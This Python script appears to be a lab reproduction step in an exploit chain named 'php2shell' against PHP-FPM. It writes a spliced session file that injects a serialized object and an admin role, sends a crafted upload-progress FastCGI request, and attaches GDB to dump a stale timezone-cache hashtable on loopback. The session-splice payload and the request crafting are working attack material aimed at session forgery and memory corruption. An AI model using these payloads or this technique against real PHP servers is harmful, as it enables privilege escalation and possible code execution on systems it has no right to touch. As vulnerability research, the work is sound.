#!/usr/bin/env python3
"""Stage A FPM occupant fieldprobe, attach variant (wake 24).

Start a plain affected FPM worker normally, let child init finish, attach GDB
to the worker, read DATEG(tzcache) directly, then break at the request-time
zend_hash_str_find_bucket read on that exact pointer and dump the 56-B struct.
This avoids the fork-follow problem (startup zend_hash hits before the request).

Loopback only; driven by the committed FastCGI client.
Usage: python3 lab/repro/php2shell-stageA-fpm-attach.py <php-fpm-bin> [outdir]
"""
import os
import pathlib
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
SID = 'tzsplice'
OBJ = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
SPLICE = ('data|s:64:"' + 'A' * 88 + OBJ + 'B' * 32 +
          '";roles|a:1:{i:0;s:5:"admin";}')
BOUND = '---------------------------20896060251896012921717172737'

GDB_TPL = '''set pagination off
set confirm off
set auto-load safe-path /
set $tc = date_globals.tzcache
printf "CAPTURED tc=%p\\n", $tc
break zend_hash.c:945 if ht == $tc
commands 1
  silent
  printf "STALE ht=%p flags=%08x mask=%08x arData=%p nNumUsed=%08x nNumOfEl=%08x\\n", ht, *(unsigned int*)((char*)ht+8), *(unsigned int*)((char*)ht+12), *(void**)((char*)ht+16), *(unsigned int*)((char*)ht+24), *(unsigned int*)((char*)ht+28)
  x/7gx ht
  printf "DONE\\n"
  quit
end
continue
'''


def wait_port(port):
    import socket
    for _ in range(150):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def child_pid(master):
    for _ in range(50):
        out = subprocess.run(['ps', '-o', 'pid=,ppid=,comm=', '--ppid', str(master)],
                             stdout=subprocess.PIPE).stdout.decode()
        pids = [int(l.split()[0]) for l in out.splitlines()
                if 'php-fpm' in l]
        if pids:
            return pids[0]
        time.sleep(0.1)
    return None


def run_case(fpm, out, port, label, query):
    d = pathlib.Path(tempfile.mkdtemp(prefix='fpm-attach-'))
    sess, www = d / 'sess', d / 'www'
    sess.mkdir(); www.mkdir()
    (sess / ('sess_' + SID)).write_text(SPLICE)
    (www / 'worker.php').write_text('<?php echo "worker\\n";')
    body = (('--%s\r\nContent-Disposition: form-data; '
             'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUND)
            + ('--%s\r\nContent-Disposition: form-data; name="file1"; '
               'filename="a.txt"\r\n\r\n1\r\n' % BOUND)
            + ('--%s--\r\n' % BOUND)).encode()
    (d / 'body').write_bytes(body)
    (d / 'probe.gdb').write_text(GDB_TPL)
    (d / 'fpm.conf').write_text(f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 1
[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[max_input_vars] = 10000
php_admin_value[session.save_path] = {sess}
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 1
php_admin_value[session.cache_limiter] =
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 1024
''')
    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')
    cmd = [str(fpm), '-n', '-F', '-y', str(d / 'fpm.conf'),
           '-d', 'date.timezone=Bogus/Zone',
           '-d', f'error_log={d}/php-error.log', '-d', 'log_errors=1',
           '-d', 'error_reporting=32767', '-d', 'display_errors=0']
    with (d / 'fpm.out').open('wb') as fo:
        master = subprocess.Popen(cmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                                  start_new_session=True)
        try:
            ready = wait_port(port)
            cpid = child_pid(master.pid) if ready else None
            result = {'ready': ready, 'child': cpid, 'gdb': '', 'client': ''}
            if cpid:
                gcmd = ['timeout', '30', 'gdb', '-q', '-batch', '-p', str(cpid),
                        '-x', str(d / 'probe.gdb')]
                with (d / 'gdb.out').open('wb') as gfo:
                    gp = subprocess.Popen(gcmd, env=env, stdout=gfo,
                                          stderr=subprocess.STDOUT,
                                          start_new_session=True)
                    time.sleep(2)
                    cc = [sys.executable, str(CLIENT), str(port),
                          str(www / 'worker.php'),
                          '--param', 'QUERY_STRING=' + query,
                          '--param', 'CONTENT_TYPE=multipart/form-data; boundary=' + BOUND,
                          '--body', str(d / 'body'),
                          '--param', 'HTTP_COOKIE=PHPSESSID=' + SID]
                    creq = subprocess.run(cc, stdout=subprocess.PIPE,
                                          stderr=subprocess.STDOUT, timeout=15)
                    (d / 'client.out').write_bytes(creq.stdout)
                    try:
                        gp.wait(timeout=32)
                    except subprocess.TimeoutExpired:
                        os.killpg(gp.pid, signal.SIGKILL)
                        gp.wait()
                result['gdb'] = (d / 'gdb.out').read_text(errors='replace')
                result['client'] = creq.stdout.decode(errors='replace')[:200]
            log = out / f'attach-{label}.log'
            with log.open('w') as lf:
                lf.write(f'case={label} query={query!r} ready={ready} '
                         f'child={cpid}\n=== GDB ===\n{result["gdb"]}\n'
                         f'=== CLIENT ===\n{result["client"]}\n')
                for lfname in ('php-error.log', 'fpm-error.log', 'fpm.out'):
                    p = d / lfname
                    if p.exists():
                        lf.write(f'=== {lfname} ===\n'
                                 f'{p.read_text(errors="replace")[:3000]}\n')
        finally:
            os.killpg(master.pid, signal.SIGKILL)
            try:
                master.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pass
    shutil.rmtree(d, ignore_errors=True)
    text = (out / f'attach-{label}.log').read_text(errors='replace')
    for pat in ('CAPTURED', 'STALE', 'DONE'):
        for line in text.splitlines():
            if pat in line:
                print(label + ': ' + line)
    print(f'{label}: log={out / f"attach-{label}.log"}')


def main():
    fpm = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2
                       else 'lab/build/evidence/w24-fpm-attach')
    out.mkdir(parents=True, exist_ok=True)
    for label, query in [('long10', 'XXX=ABCDEFGHIJ'), ('none', '')]:
        run_case(fpm, out, 18140 + (label == 'none'), label, query)


if __name__ == '__main__':
    main()
